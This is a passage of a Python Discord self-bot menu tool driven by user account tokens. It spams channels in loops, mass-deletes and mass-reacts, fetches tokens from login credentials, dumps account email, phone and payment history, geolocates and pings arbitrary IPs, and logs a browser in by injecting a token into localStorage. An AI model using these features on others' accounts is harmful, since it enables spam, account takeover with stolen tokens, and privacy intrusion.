            header = {'Authorization': user_token}
            i = 0
            while num_messages == 0 or i < num_messages:
                response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", data=payload, headers=header)
                if response.status_code == 200:
                    print(GREEN + f"[#] Successfully sent Message {i + 1}{'/' + str(num_messages) if num_messages != 0 else ''}" + ENDC + " : " + gradient_text(message_content) + ENDC)
                    i += 1
                else:
                    print(RED + f"[!] Failed to send message {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
                    print("[#] Retrying in 5 seconds...")
                    time.sleep(5)
                time.sleep(delay)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_linkorid = validate_input(gradient_text("[#] Channel: "), lambda x: re.search(r'/channels/(\d+)/', x) or x.isdigit(), "[#] Invalid Input. Please enter a valid channel link or id.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_linkorid)
            channel_id = channel_id_match.group(1) if channel_id_match else channel_linkorid
            headers = {'Authorization': user_token, **HEADERS}
            params = {'limit': 1}
            print(GREEN + "[#] Monitoring Channel. Press Ctrl + C to stop." + ENDC)
            processed_messages = set()
            try:
                while True:
                    response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages", params=params, headers=headers)
                    if response.status_code != 200:
                        print(RED + f"[!] Failed to retrieve messages {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
                    else:
                        messages = response.json()
                        for message in reversed(messages):
                            if 'content' in message and 'id' in message:
                                message_id = message['id']
                                if message_id not in processed_messages:
                                    author = message['author']['username']
                                    content = message['content']
                                    if 'bot' in message['author'] and message['author']['bot']:
                                        author += " [BOT]"
                                    if 'attachments' in message:
                                        for attachment in message['attachments']:
                                            filename = attachment['filename']
                                            if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.webp', '.gif', '.gifv', '.mp4', '.webm', '.mov', '.mp3', '.wav', '.ogg')):
                                                if content: content += " "
                                                for exts, label in {('.jpg', '.jpeg', '.png', '.webp'): "[Image]", ('.gif', 'gifv'): "[GIF]", ('.mp4', '.webm', '.mov'): "[Video]", ('.mp3', '.wav', '.ogg'): "[Audio]"}.items():
                                                    if filename.lower().endswith(exts):
                                                        content += RED + label + ENDC
                                                        break
                                    if 'sticker_items' in message:
                                        if content: content += " "
                                        content += RED + "[Sticker]" + ENDC
                                    print(GRAY + f"[#] {author}: {content}" + ENDC)
                                    processed_messages.add(message_id)
            except KeyboardInterrupt:
                pass
        elif mode == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            confirmation = validate_input(gradient_text("[#] Are you sure you want to close all DMs for the provided token?\n[#] This will not leave group chats.\n[#] (y/n): "), lambda v: v.lower() in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
            if confirmation.lower() == "y":
                close_all_dms(user_token)
            else:
                print(RED + "[#] DM closure canceled. No DMs were closed." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '7':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            confirmation = validate_input(gradient_text("[#] Are you sure you want to leave all Groupchats for the provided token?\n[#] This will not close DMs.\n[#] (y/n): "), lambda v: v.lower() in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
            if confirmation.lower() == "y":
                leave_all_groupchats(user_token)
            else:
                print(RED + "[#] Groupchat leaving canceled. No Groupchats were left." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '8':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_linkorid = validate_input(gradient_text("[#] Channel: "), lambda x: re.search(r'/channels/(\d+)/', x) or x.isdigit(), "[#] Invalid Input. Please enter a valid channel link or id.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_linkorid)
            channel_id = channel_id_match.group(1) if channel_id_match else channel_linkorid
            confirmation = validate_input(gradient_text("[#] Are you sure you want to delete all messages from the provided token in this channel?\n[#] (y/n): "), lambda v: v.lower() in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
            if confirmation.lower() == 'y':
                try:
                    delete_all_messages(user_token, channel_id)
                except Exception:
                    print(RED + "[!] Unknown error occurred." + ENDC)
            else:
                print(RED + "[#] Message deletion cancelled." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '9':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            type_options = {'1': 'Everyone', '2': 'Me Only'}
            for option, type in type_options.items():
                print(gradient_text(f"[#] {option}. {type}"))
            type = validate_input(gradient_text("[#] Choice: "), lambda x: x in type_options, "[#] Invalid Choice. Please enter either 1 or 2.")
            react_to_messages(user_token, type)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '10':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            type_options = {'1': 'Text Statuses', '2': 'Emoji & Text Statuses'}
            for option, type in type_options.items():
                print(gradient_text(f"[#] {option}. {type}"))
            type = validate_input(gradient_text("[#] Choice: "), lambda x: x in type_options, "[#] Invalid Choice. Please enter either 1 or 2.")
            if type == '1':
                status_list_input = validate_input(gradient_text("[#] Statuses (separated by commas): "), lambda value: len(value.split(',')) >= 2 and all(s.strip() != '' for s in value.split(',')) and len(set(s.strip() for s in value.split(','))) == len(value.split(',')), "[#] Invalid Statuses. Please enter at least 2 unique statuses separated by commas.")
                status_list = [status.strip() for status in status_list_input.split(',') if status.strip()]
            elif type == '2':
                emoji_status_pairs_input = validate_input(gradient_text("[#] Statuses (e.g., <:en:eid> - Status1, <:en2:eid2> - Status2): "), lambda value: all(len(pair.split('-')) == 2 and pair.split('-')[0].strip().startswith('<:') and len(set(pair.split('-')[1].strip() for pair in value.split(','))) == len(value.split(',')) for pair in value.split(',')), "[#] Invalid Emoji & Text pairs. Please enter at least 2 unique pairs in the correct format.")
                emoji_status_pairs = [pair.strip() for pair in emoji_status_pairs_input.split(',') if pair.strip()]
                status_list = []
                for pair in emoji_status_pairs:
                    emoji_text_pair = pair.split('-')
                    emoji = emoji_text_pair[0].strip()
                    text = emoji_text_pair[1].strip()
                    emoji_id = emoji.split(':')[2][:-1]
                    status_list.append({"emoji": emoji, "text": text, "emoji_id": emoji_id})
            delay =  validate_input(gradient_text("[#] Delay (in seconds): "), lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid Delay. Please enter a positive number.")
            delay = float(delay)
            headers = {'Authorization': user_token, **HEADERS}
            index = 0
            while True:
                if type == '1':
                    status = status_list[index]
                    payload = {'custom_status': {'text': status}}
                    status_message = status
                elif type == '2':
                    emoji_text_pair = status_list[index]
                    payload = {'custom_status': {'text': emoji_text_pair['text'], 'emoji_name': emoji_text_pair['emoji'].split(':')[1], 'emoji_id': emoji_text_pair['emoji_id']}}
                    status_message = f"[{emoji_text_pair['emoji_id']}] {emoji_text_pair['text']}"
                payload_json = json.dumps(payload)
                response = requests.patch('https://discord.com/api/v9/users/@me/settings', data=payload_json, headers=headers)
                if response.status_code == 200:
                    print(GREEN + "[#] Changed Status to: " + gradient_text(status_message) + ENDC)
                else:
                    print(RED + f"[!] Failed to change Status {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
                index = (index + 1) % len(status_list)
                time.sleep(delay)
        elif mode == '11':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            ip_address = validate_input(gradient_text("[#] IP Address: "), validate_ip, "[#] Invalid IP Address. Please check the IP and try again.")
            ip_data = ip_lookup(ip_address)
            if ip_data is not None:
                print(GRAY + f"[#] City: {ip_data.get('city', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Region: {ip_data.get('egion', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Country: {ip_data.get('country', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Postal: {ip_data.get('postal', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Timezone: {ip_data.get('timezone', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Hostname: {ip_data.get('hostname', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Organization: {ip_data.get('org', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Location: {ip_data.get('loc', 'N/A')}" + ENDC)
            else:
                print(RED + "[!] Unknown error occurred." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '12':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            ip_address = validate_input(gradient_text("[#] IP Address: "), validate_ip, "[#] Invalid IP Address. Please check the IP and try again.")
            ping_count = validate_input(gradient_text("[#] Number of times to ping (0 = infinite): "), lambda x: x.isdigit() and int(x) > -1, "[#] Invalid Input. Please enter a non-negative integer.")
            ping_ip(ip_address, int(ping_count))
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '13':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            hypesquad_options = {'1': 'Bravery', '2': 'Brilliance', '3': 'Balance', '4': 'Remove'}
            for option, house in hypesquad_options.items():
                print(gradient_text(f"[#] {option}. {house}"))
            selected_option = validate_input(gradient_text("[#] Choice: "), lambda x: x in hypesquad_options, "[#] Invalid Choice. Please enter either 1, 2, 3, or 4.")
            headers = {'Authorization': user_token, **HEADERS}
            if selected_option == '4':
                response = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers)
            else:
                payload = {'house_id': selected_option}
                response = requests.post('https://discord.com/api/v9/hypesquad/online', json=payload, headers=headers)
            if response.status_code == 204:
                print(GREEN + f"[#] {'Successfully removed HypeSquad House.' if selected_option == '4' else f'Successfully changed HypeSquad House to {hypesquad_options[selected_option]}.'}" + ENDC)
            else:
                print(RED + f"[!] {'Failed to remove HypeSquad House' if selected_option == '4' else 'Failed to change Hypesquad House'} - RSC: {response.status_code}" + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '14':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            type_options = {'1': 'Server ID', '2': 'Server Invite'}
            for option, type in type_options.items():
                print(gradient_text(f"[#] {option}. {type}"))
            type = validate_input(gradient_text("[#] Choice: "), lambda x: x in type_options, "[#] Invalid Choice. Please enter either 1 or 2.")
            if type == '1':
                user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
                server_id = validate_input(gradient_text("[#] Server ID: "), lambda id: id.isdigit() and 18 <= len(id) <= 21, "[#] Invalid Server ID. Please check the ID and try again.")
                get_serverid_info(user_token, server_id)
            elif type == '2':
                invite = validate_input(gradient_text("[#] Server Invite: "), lambda x: len(x) > 0, "[#] Invalid Invite. Please check the invite and try again.")
                get_invite_info(invite)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '15':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            email = validate_input(gradient_text("[#] Email: "), lambda x: re.match(r"[^@]+@[^@]+\.[^@]+", x), "[#] Invalid Email. Please check the email and try again.")
            password = validate_input(gradient_text("[#] Password: "), lambda x: len(x) > 0, "[#] Invalid Password. Password cannot be empty.")
            payload = {'email': email, 'password': password}
            response = requests.post("https://discord.com/api/v9/auth/login", json=payload)
            if response.status_code == 200:
                if response.json().get('mfa') is True:
                    token = response.json()['ticket']
                    mfa = validate_input(gradient_text("[#] MFA Code: "), lambda x: len(x) > 0, "[#] Invalid MFA Code. MFA Code cannot be empty.")
                    payload = {'code': mfa, 'ticket': token}
                    response2 = requests.post("https://discord.com/api/v9/auth/mfa/totp", json=payload)
                    if response2.status_code == 200:
                        print(GRAY + f"[#] User ID: {response.json()['user_id']}\n[#] Token: {response2.json()['token']}" + ENDC)
                    elif response2.status_code == 400:
                        if response2.json().get("code") == 60008:
                            print(RED + "[!] Invalid MFA code." + ENDC)
                        else:
                            print(RED + "[!] Unknown error occurred." + ENDC)
                    else:
                        print(RED + "[!] Unknown error occurred." + ENDC)
                else:
                    print(GRAY + f"[#] User ID: {response.json()['user_id']}\n[#] Token: {response.json()['token']}" + ENDC)
            elif response.status_code == 400:
                error_json = response.json()
                if "captcha_key" in error_json and "captcha-required" in error_json.get("captcha_key", []):
                    print(RED + "[!] CAPTCHA required, unable to proceed." + ENDC)
                else:
                    errors = error_json.get("errors", {})
                    login_errors = errors.get("login", {}).get("_errors", [])
                    password_errors = errors.get("password", {}).get("_errors", [])
                    email_verification_needed = any(error.get("code") == "ACCOUNT_LOGIN_VERIFICATION_EMAIL" for error in login_errors)
                    invalid_login = any(error.get("code") == "INVALID_LOGIN" for error in login_errors) or any(error.get("code") == "INVALID_LOGIN" for error in password_errors)
                    if email_verification_needed:
                        print(RED + "[!] New login location detected. Check your Email to verify." + ENDC)
                    elif invalid_login:
                        print(RED + "[!] Email or Password is invalid." + ENDC)
                    else:
                        print(RED + "[!] Unknown error occurred." + ENDC)
            else:
                print(RED + "[!] Unknown error occurred." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '16':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            user_info = get_user_info(user_token)
            account_locked_state = get_account_locked(user_token)
            account_standing_state = get_account_standing(user_token)
            num_guilds = get_num_user_guilds(user_token)
            num_friends, num_blocked_users, num_friend_requests = get_num_user_friends(user_token)
            available_boosts, used_boosts = get_num_boosts(user_token)
            if 'premium_type' in user_info and user_info['premium_type'] > 0:
                nitro_expiry = num_nitro_expiry_days(user_token)
            if user_info:
                print(GRAY + f"[#] Username: {user_info['username']}" + ENDC)
                print(GRAY + f"[#] ID: {user_info['id']}" + ENDC)
                print(GRAY + f"[#] Email: {user_info.get('email', 'N/A')}" + ENDC)
                print(GRAY + f"[#] Email Verified: {'Yes' if user_info.get('verified') else 'No'}" + ENDC)
                print(GRAY + f"[#] Phone: {user_info.get('phone', 'N/A')}" + ENDC)
                print(GRAY + f"[#] MFA Enabled: {'Yes' if user_info.get('mfa_enabled') else 'No'}" + ENDC)
                print(GRAY + f"[#] Auth Types: {', '.join({1: 'Keys', 2: 'App', 3: 'SMS'}.get(auth_type, 'N/A') for auth_type in user_info['authenticator_types']) if user_info['authenticator_types'] else 'None'}")
                print(GRAY + f"[#] Locked: {'Yes' if account_locked_state else 'No'}" + ENDC)
                print(GRAY + f"[#] Standing: {('N/A' if account_standing_state is None else {100: 'All good! (100)', 75: 'Limited (75)', 50: 'Very Limited (50)', 25: 'At risk (25)'}.get(account_standing_state, 'N/A' if account_standing_state > 100 else 'N/A'))}" + ENDC)
                print(GRAY + f"[#] Created: {parse_date(str(datetime.fromtimestamp(((int(user_info['id']) >> 22) + 1420070400000) / 1000) - timedelta(hours=2)))}" + ENDC)
                print(GRAY + f"[#] Locale: {({'id': 'Indonesian', 'da': 'Danish', 'de': 'German', 'en-GB': 'English, UK', 'en-US': 'English, US', 'es-ES': 'Spanish', 'es-419': 'Spanish, LATAM', 'fr': 'French', 'hr': 'Croatian', 'it': 'Italian', 'lt': 'Lithuanian', 'hu': 'Hungarian', 'nl': 'Dutch', 'no': 'Norwegian', 'pl': 'Polish', 'pt-BR': 'Portuguese, Brazilian', 'ro': 'Romanian, Romania', 'fi': 'Finnish', 'sv-SE': 'Swedish', 'vi': 'Vietnamese', 'tr': 'Turkish', 'cs': 'Czech', 'el': 'Greek', 'bg': 'Bulgarian', 'ru': 'Russian', 'uk': 'Ukrainian', 'hi': 'Hindi', 'th': 'Thai', 'zh-CN': 'Chinese, China', 'ja': 'Japanese', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean'}).get(user_info['locale'], user_info['locale'])}" + ENDC)
                if 'premium_type' in user_info and user_info['premium_type'] > 0:
                    print(GRAY + "[#] Nitro: Yes" + ENDC)
                    print(GRAY + f"[#] Nitro Type: { { 1: '$5 Nitro', 2: '$10 Nitro', 3: '$3 Nitro'}[user_info['premium_type']] }" + ENDC)
                    print(GRAY + f"[#] Nitro Expiry: {nitro_expiry}" + ENDC)
                else:
                    print(GRAY + "[#] Nitro: No" + ENDC)
                if user_info['premium_type'] == 2 or available_boosts > 0:
                    print(GRAY + f"[#] Available Boosts: {available_boosts}" + ENDC)
                if used_boosts:
                    used_boosts_count = {}
                    for boost in used_boosts:
                        server_id = boost['server_id']
                        used_boosts_count[server_id] = used_boosts_count.get(server_id, 0) + 1
                    used_boosts_formatted = ' | '.join(f"{count}x - {server_id}" for server_id, count in used_boosts_count.items())
                    print(GRAY + f"[#] Active Boosts: {used_boosts_formatted}" + ENDC)
                print(GRAY + f"[#] NSFW Allowed: {'Yes' if user_info.get('nsfw_allowed') else 'No'}" + ENDC)
                print(GRAY + f"[#] Clan: {user_info['clan']['tag'] if user_info['clan'] else 'None'}" + ENDC)
                print(GRAY + f"[#] Servers: {num_guilds}" + ENDC)
                print(GRAY + f"[#] Friends: {num_friends}" + ENDC)
                print(GRAY + f"[#] Friend Requests: {num_friend_requests}" + ENDC)
                print(GRAY + f"[#] Blocked Users: {num_blocked_users}" + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '17':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            headers = {'Authorization': user_token, **HEADERS}
            response = requests.get('https://discord.com/api/v9/users/@me/billing/payments', headers=headers)
            if response.status_code == 200:
                payment_history = response.json()
                if payment_history:
                    total_per_currency = {}
                    for payment in payment_history:
                        if payment['status'] == 1:
                            amount = payment.get('amount', {})
                            currency = payment.get('currency', '').upper()
                            amount_value = (amount.get('amount', 0) if isinstance(amount, dict) else amount) / 100
                            total_per_currency[currency] = total_per_currency.get(currency, 0) + amount_value
                    print(GRAY + f"[#] Total: {len(payment_history)} | Successful: {sum(1 for p in payment_history if p['status'] == 1)} | Failed: {sum(1 for p in payment_history if p['status'] == 2)} | Spent: {' '.join([f'{currency} {total:.2f}' for currency, total in sorted(total_per_currency.items(), key=lambda x: x[1], reverse=True)])}" + ENDC)
                    for payment in payment_history:
                        amount = payment.get('amount', {})
                        source = payment.get('payment_source', {})
                        currency = payment.get('currency', '').upper()
                        amount_value = (amount.get('amount', 0) if isinstance(amount, dict) else amount) / 100
                        amount_display = f"{currency} {amount_value:.2f}"
                        print(GRAY + f"[#] Item: {payment.get('description', 'Unknown')} | Amount: {amount_display} | Status: {GREEN + 'Success' + GRAY if payment['status'] == 1 else RED + 'Failed' + GRAY} | Country: {source.get('country', 'N/A')} | Date: {parse_date(payment['created_at'])}" + ENDC)
                else:
                    print(RED + "[#] No payment history found." + ENDC)
            else:
                print(RED + f"[!] Failed to retrieve payment history {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '18':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            headers = {'Authorization': user_token, **HEADERS}
            print(gradient_text("[#] Logging in with Token.."))
            options = webdriver.ChromeOptions()
            options.add_experimental_option("detach", True)
            options.add_experimental_option("excludeSwitches", ['enable-logging'])
            options.add_argument("--log-level=3")
            options.add_argument("start-maximized")
            try:
                driver = webdriver.Chrome(options=options)
                driver.get("https://discord.com/login")
                driver.execute_script('''function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }''' + f'\nlogin("{user_token}")')
                print(GREEN + "[#] Successfully logged in!" + ENDC)
            except exceptions.WebDriverException:
                print(RED + "[!] WebDriverException occurred." + ENDC)
            except Exception:
                print(RED + "[!] Unknown error occurred." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '19':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            server_id = validate_input(gradient_text("[#] Server ID: "), lambda id: id.isdigit() and 18 <= len(id) <= 19, "[#] Invalid Server ID. Please check the ID and try again.")
            inner_emoji_dir = os.path.join("emojis", str(server_id))
            try:
                os.makedirs(inner_emoji_dir, exist_ok=True)
            except PermissionError:
                print(RED + "[!] Permission Denied. Unable to create directory." + ENDC)
                input(gradient_text("[#] Press enter to return."))
                continue
            try:
                emojis = get_guild_emojis(user_token, server_id)
                if emojis == 404:
                    print(RED + "[!] Failed to retrieve Emojis for specified Server." + ENDC)
                elif emojis:
                    scs = asyncio.run(download_emoji_async(emojis, inner_emoji_dir))
                    print(gradient_text(f"[#] Successfully downloaded {scs} of {len(emojis)} Emojis."))
                else:
                    print(RED + "[!] No Emojis found for specified Server." + ENDC)
            except Exception:
                print(RED + "[!] Unknown error occurred while processing Emojis." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '20':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            server_id = validate_input(gradient_text("[#] Server ID: "), lambda id: id.isdigit() and 18 <= len(id) <= 19, "[#] Invalid Server ID. Please check the ID and try again.")
            inner_sticker_dir = os.path.join("stickers", str(server_id))
            try:
                os.makedirs(inner_sticker_dir, exist_ok=True)
            except PermissionError:
                print(RED + "[!] Permission Denied. Unable to create directory." + ENDC)
                input(gradient_text("[#] Press enter to return."))
                continue
            try:
                stickers = get_guild_stickers(user_token, server_id)
                if stickers == 404:
                    print(RED + "[!] Failed to retrieve Stickers for specified Server.")
                elif stickers:
                    scs = asyncio.run(download_stickers_async(stickers, inner_sticker_dir))
                    print(gradient_text(f"[#] Successfully downloaded {scs} of {len(stickers)} Stickers."))
                else:
                    print(RED + "[!] No Stickers found for specified Server." + ENDC)
            except Exception:
                print(RED + "[!] Unknown error occurred while processing Stickers." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
    except KeyboardInterrupt:
        continue
    except EOFError:
        pass
